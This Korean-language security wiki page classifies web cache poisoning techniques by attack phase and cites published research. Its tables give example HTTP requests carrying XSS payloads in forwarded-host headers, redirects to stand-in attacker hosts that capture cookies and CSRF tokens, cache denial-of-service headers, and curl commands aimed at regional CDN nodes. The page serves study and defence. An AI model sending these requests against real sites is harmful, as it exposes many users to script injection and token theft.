---
title: Web Cache Poisoning
description: 
published: true
date: 2025-07-31T17:58:57.850Z
tags: cache response analysis, unkeyed input detection, x‑forwarded‑host manipulation, x‑original‑url header exploitation, x‑forwarded‑server misrouting, script tag injection via host header, internationalization data injection, direct response caching, chain poisoning, select poisoning, dom‑based cache poisoning, discreet poisoning, cache poisoning at scale, gotta cache ‘em all, modern cache poisoning (ccs’24), cpdos hho, cpdos hmc, cpdos hmo, precise timing attack, regional cache poisoning, cookie domain override, token extraction via redirect
editor: markdown
dateCreated: 2025-07-15T08:38:22.119Z
---

# Web Cache Poisoning

## 개요

“Web Cache Poisoning”은 캐시 서버와 백엔드 서버가 HTTP 요청의 메타데이터(헤더, 파라미터 등)를 서로 다르게 해석하거나, 캐싱 기준이 일치하지 않는 점을 악용하는 공격이다. 공격자는 특정 입력이나 헤더 값을 삽입해 자신에게 유리하게 조작된 응답을 캐시에 저장시키고, 이후 일반 사용자가 해당 캐시를 요청하도록 유도해 악성 콘텐츠를 전달하거나 인증 우회, 기능 오작동을 유발할 수 있다. 캐시 키 결정 로직의 불일치나, 헤더 무시 여부 차이 등을 기반으로 하며, 결과적으로 신뢰되지 않은 응답이 다수 사용자에게 제공되는 정보가 오염된다.

## 분류

> 메타데이터 해석 불일치 (Metadata Interpretation Gap)
> → 상태·세션 해석 불일치 (State & Session Mismatch)
> → Web Cache Poisoning

## 절차

| Phase          | Description                                                                                                                                                         |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Reconnaissance | 대상 환경의 Frontend 서버(리버스 프록시, CDN, 로드 밸런서)와 Backend 서버(웹 애플리케이션) 간의 HTTP 요청 처리 방식 차이, 지원 프로토콜, 캐시 정책 등을 식별한다.                                                         |
| Mutation       | 캐시 서버와 오리진 서버 간 요청 해석 차이점을 이용하여 변조 가능한 헤더나 파라미터(`X-Forwarded-*`, `Host`, `User-Agent` 등)을 식별하여 캐시 키에는 영향을 주지 않지만, 서버 응답 콘텐츠에는 영향을 줄 수 있는 입력 요소(Unkeyed Input)를 찾는다. |
| Injection      | 변형 가능한 입력 요소에 악성 스크립트(JavaScript, HTML 등)를 삽입하여, 애플리케이션이 이를 포함한 응답을 생성하도록 유도한다.                                                                                     |
| Poisoning      | 삽입된 콘텐츠가 다른 사용자 요청에도 반환되는지 확인하고 캐시 오염 성공 여부를 판단하기 위해 조작된 응답이 실제로 캐시 서버에 저장되는지 검증한다.                                                                                 |
| Timing         | 캐시의 만료 시간과 무효화 메커니즘을 파악하고 지속 공격 또는 자동 재오염 전략을 수립하며, 오염된 캐시 콘텐츠가 얼마나 오래 유지되는지 어떤 조건에서 무효화되는지 분석한다.                                                                   |
| Exfiltration   | 오염된 캐시 응답을 다수의 실제 사용자 요청에 반사시켜 XSS, 피싱, DOM Poisoning 같은 2차 공격을 실행하거나, 사용자의 브라우저 환경에서 민감 정보를 외부로 전송하도록 유도하여 탈취한다.                                                   |

<div style="text-align: left;">
  <img
    src="/web_cache_poisoning.png"
    alt="Web Cache Poisoning 다이어그램"
    width="1000"
    style="display: block;
           margin: 0 0 1em 0;
           height: auto;"
  />
</div>

## 공격기법

### Reconnaissance

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Cache Response Analysis</td>
      <td>
        <pre><code>GET / HTTP/1.1
Host: unity3d.com
X-Host: portswigger-labs.net
Response Headers:
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age=1800</code></pre>
      </td>
      <td>Age와 max-age 헤더를 통해 캐시의 만료 시간을 정확히 파악하여 공격 타이밍을 결정한다.</td>
      <td>[A]</td>
    </tr>
    <tr>
      <td>Unkeyed Input Detection</td>
      <td>
        <pre><code>GET /en?cb=1 HTTP/1.1
Host: www.example.com
X-Forwarded-Host: canary</code></pre>
      </td>
      <td>캐시 키에 영향을 주지 않는 입력 요소(헤더, 쿼리 등)를 식별하여 공격에 활용할 수 있는지 판단하는 기법</td>
      <td>[B]</td>
    </tr>
  </tbody>
</table>

### Mutation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>X-Forwarded-Host Manipulation</td>
      <td>
        <pre><code>GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a.">&lt;script>alert(1)&lt;/script></code></pre>
      </td>
      <td>X-Forwarded-Host 헤더를 조작하여 Open Graph URL 생성 과정에서 XSS 페이로드 삽입</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>X-Original-URL Header Exploitation</td>
      <td>
        <pre><code>GET /anything HTTP/1.1
Host: unity.com
X-Original-URL: /admin</code></pre>
      </td>
      <td>Drupal, Symfony, Zend 프레임워크에서 지원하는 X-Original-URL 헤더를 사용하여 요청 경로를 재정의</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>X-Forwarded-Server Misrouting</td>
      <td>
        <pre><code>GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Server: canary</code></pre>
      </td>
      <td>SaaS 애플리케이션에서 X-Forwarded-Server 헤더가 Host 헤더보다 우선시되어 내부 라우팅 혼란 야기</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Injection

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Script Tag Injection via Host Header</td>
      <td>
        <pre><code>GET / HTTP/1.1
Host: unity3d.com
X-Host: portswigger-labs.net
Response:
&lt;script src="https://portswigger-labs.net/sites/files/foo.js">&lt;/script></code></pre>


  </td>
  <td>unkeyed input을 통해 스크립트 태그의 src 속성을 조작하여 악성 JavaScript 로드</td>
  <td>[1]</td>
</tr>
<tr>
  <td>Internationalization Data Injection</td>
  <td>
    <pre><code>GET /api/i18n/en HTTP/1.1
Host: portswigger-labs.net
Response:
{"Show more":"&lt;svg onload=alert(1)>"};</code></pre> </td> <td>data-site-root 속성을 조작하여 국제화 데이터를 악성 페이로드로 대체</td> <td>\[1]</td> </tr>

  </tbody>
</table>

### Poisoning

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Direct Response Caching</td>
      <td>
        <pre><code>GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a.">&lt;script>alert(1)&lt;/script>
Cached Response: &lt;meta property="og:image" content="https://a.">&lt;script>alert(1)&lt;/script>"/>
Cache-Control: no-cache</code></pre> </td> <td>no-cache 헤더가 있어도 CDN(Akamai)에서 악성 응답이 캐시됨</td> <td>\[1]</td> </tr> <tr> <td>Chain Poisoning</td> <td> <pre><code>GET /redirect?to=https://attacker.com HTTP/1.1
Host: victim.com
X-Forwarded-Host: attacker.com</code></pre> </td> <td>내부·외부 캐시 간 키 불일치를 이용해 Location 헤더가 공격자 도메인으로 바뀐 응답을 캐시</td> <td>\[1]</td> </tr> <tr> <td>Select Poisoning</td> <td> <pre><code>GET / HTTP/1.1
Host: redacted.com
User-Agent: Mozilla/5.0 … Firefox/60.0
X-Forwarded-Host: a">&lt;iframe onload=alert(1)>
Vary: User-Agent, Accept-Encoding</code></pre> </td> <td>Vary 헤더를 조작해 특정 요청 헤더 값을 캐시 키에 포함, 해당 사용자에게만 변조된 콘텐츠 제공</td> <td>\[1]</td> </tr> <tr> <td>DOM-based Cache Poisoning</td> <td> <pre><code>GET /api/data HTTP/1.1
Host: victim.com
X-Forwarded-Host: attacker.com
Response JSON:
{"script":"&lt;img src=x onerror=alert(1)>"};</code></pre> </td> <td>캐시된 JSON을 innerHTML 등으로 처리할 때 DOM XSS 유발</td> <td>\[1]</td> </tr> <tr> <td>Discreet Poisoning</td> <td> <pre><code>GET /promo HTTP/1.1
Host: victim.com
X-Forwarded-Host: attacker.com
Cookie: session=abc123</code></pre> </td> <td>캐시된 HTML 조각(fragment)을 조합해 은밀한 페이로드를 사용자에게만 삽입</td> <td>\[1]</td> </tr> <tr> <td>Cache Poisoning at Scale</td> <td> <pre><code>GET /?q=1 HTTP/1.1
Host: victim.com
X-Forwarded-Host: attacker.com</code></pre> </td> <td>전 세계 분산된 캐시 노드에 동시에 페이로드를 삽입해 대규모 동일 응답 캐싱</td> <td>\[C]</td> </tr> <tr> <td>Gotta Cache ‘Em All</td> <td> <pre><code>GET /asset.js HTTP/1.1
Host: example.com
Cookie: flavor=pikachu</code></pre> </td> <td>다양한 unkeyed input을 조합해 수백 개 이상의 캐시 키를 생성·오염시켜 전체 캐시 장악</td> <td>\[D]</td> </tr> <tr> <td>Modern Cache Poisoning (CCS’24)</td> <td> <pre><code>GET /api/data HTTP/1.1 ↵ :authority: modern.com
X-Host: evil.com
X-Cache-Status: HIT</code></pre> </td> <td>HTTP/2 pseudo-header와 CDN HTTP/1 변환 로직 간 파싱 차이를 악용해 최신 CDN에서도 오염</td> <td>\[E]</td> </tr> <tr> <td>CPDoS HHO (HTTP Header Oversize)</td> <td> <pre><code>GET /resource HTTP/1.1
Host: victim.com
X-Oversized-Header-1: Big value
X-Oversized-Header-2: Big value</code></pre> </td> <td>캐시는 허용하지만 오리진 서버는 거부하는 헤더 크기 불일치로 에러 페이지를 캐시해 서비스 거부</td> <td>\[F]</td> </tr> <tr> <td>CPDoS HMC (HTTP Meta Character)</td> <td> <pre><code>GET /index.html HTTP/1.1
Host: example.org
X-Metachar-Header: \n</code></pre> </td> <td>캐시는 통과시키지만 오리진 서버는 유효하지 않은 요청으로 처리, 에러 페이지가 캐시돼 서비스 거부</td> <td\[F]</td> </tr> <tr> <td>CPDoS HMO (HTTP Method Override)</td> <td> <pre><code>GET /index.html HTTP/1.1
Host: victim.com
X-HTTP-Method-Override: POST</code></pre> </td> <td>캐시는 GET으로 인식하지만 오리진은 POST로 처리해 에러 페이지가 캐시돼 서비스 거부</td> <td>[F]</td> </tr>

  </tbody>
</table>

### Timing

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Precise Timing Attack</td>
      <td>
        <pre><code># Check current cache status
GET / HTTP/1.1
Host: unity3d.com
Response Headers:
Age: 174
Cache-Control: public, max-age=1800
# Attack at calculated expiry time (1800-174 = 1626 seconds later)</code></pre>

  </td>
  <td>Age와 max-age 헤더를 분석하여 캐시 만료 시점을 정확히 계산하고 해당 시점에 공격 수행</td>
  <td>[1]</td>
</tr>
<tr>
  <td>Regional Cache Poisoning</td>
  <td>
    <pre><code># CloudFront IP targeting
curl -H "Host: catalog.data.gov" -H "X-Forwarded-Host: attacker.com" http://54.230.xxx.xxx/
# Cloudflare cache identification
curl https://target.com/cdn-cgi/trace
# Response: colo=AMS (Amsterdam cache)</code></pre>

  </td>
  <td>특정 지역 캐시 서버 IP를 식별해 해당 지역 캐시만을 대상으로 공격 수행</td>
  <td>[1]</td>
</tr>


  </tbody>
</table>

### Exfiltration

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Cookie Domain Override</td>
      <td>
        <pre><code>GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: xyz
Response:
Set-Cookie: locale=en; domain=xyz</code></pre> </td> <td>X-Forwarded-Host 헤더를 사용하여 쿠키 도메인을 조작하고 세션 하이재킹 수행</td> <td>[1]</td> </tr> <tr> <td>Token Extraction via Redirect</td> <td> <pre><code>GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: nothttps
Response:
HTTP/1.1 301 Moved Permanently
Location: https://attacker.com/en</code></pre> </td> <td>POST 요청을 리다이렉트시켜 사용자 정의 HTTP 헤더에서 CSRF 토큰 탈취</td> <td>[1]</td> </tr>

  </tbody>
</table>

## 분류에 해당하는 문서

\[1] [https://portswigger.net/research/practical-web-cache-poisoning](https://portswigger.net/research/practical-web-cache-poisoning)

## 기타 참고문헌

\[A] [https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws)
\[B] [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
\[C] [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
\[D] [https://portswigger.net/research/gotta-cache-em-all](https://portswigger.net/research/gotta-cache-em-all)
\[E] [https://www.jianjunchen.com/p/web-cache-posioning.CCS24.pdf](https://www.jianjunchen.com/p/web-cache-posioning.CCS24.pdf)
\[F] [https://cpdos.org/](https://cpdos.org/)
